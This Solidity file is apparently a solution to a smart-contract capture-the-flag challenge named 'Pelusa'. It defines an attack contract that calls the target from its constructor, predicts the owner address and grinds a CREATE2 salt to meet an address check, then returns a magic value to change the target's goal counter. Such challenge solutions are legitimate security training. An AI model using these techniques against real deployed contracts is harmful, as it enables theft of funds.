// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;
import "hardhat/console.sol";

interface IPelusa {
    function passTheBall() external;
    function shoot() external;
}

contract AttackPelusa {
    address public immutable Pelusaowner;
    address internal player;
    uint256 public goals = 1;
    address pelusa;

    constructor(address _pelusa, address _pelusaOwner) {
        Pelusaowner = _pelusaOwner;
        pelusa = _pelusa;
        IPelusa(_pelusa).passTheBall();
    }

    function getBallPossesion() external view returns (address){
        return Pelusaowner;
    }

    function handOfGod() external returns (uint256){
        goals = 2;
        return 22061986;
    }

    function attackShoot() external {
        IPelusa(pelusa).shoot();
    }
}

contract AttackPelusaFactory {

    address public pelusa ;
    address public pelusaOwner ;
    constructor(address _pelusa, address _pelusaDeployer) {
        pelusaOwner = address(uint160(uint256(keccak256(abi.encodePacked(_pelusaDeployer, blockhash(block.number))))));
        pelusa = _pelusa;
    }
    
    function getAddress(uint _salt) public view returns (address) {
        bytes memory bytecode = type(AttackPelusa).creationCode;
        bytecode = abi.encodePacked(bytecode, abi.encode(pelusa, pelusaOwner));
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
        return address(uint160(uint(hash)));    // NOTE: cast last 20 bytes of hash to address
    }

    function getFuzzSalt() public view returns (uint256){
        address attackPelusa;
        for(uint i ; i<1000; ++i){
            attackPelusa = getAddress(i);
            if (uint256(uint160(attackPelusa)) % 100 == 10){ 
                console.log("\nSalt Found : ",i);
                return i;
            }
        }
        revert("Salt Not Found");
    }

    function deployAndShoot() public returns(address addr){
        bytes memory bytecode = type(AttackPelusa).creationCode;
        bytecode = abi.encodePacked(bytecode, abi.encode(pelusa, pelusaOwner));
        uint _salt = getFuzzSalt();
       
        assembly {
            addr := create2(0, add(bytecode, 0x20), mload(bytecode), _salt)
            if iszero(extcodesize(addr)) {
                revert(0, 0)
            }
        }
        AttackPelusa(addr).attackShoot();
    }
}
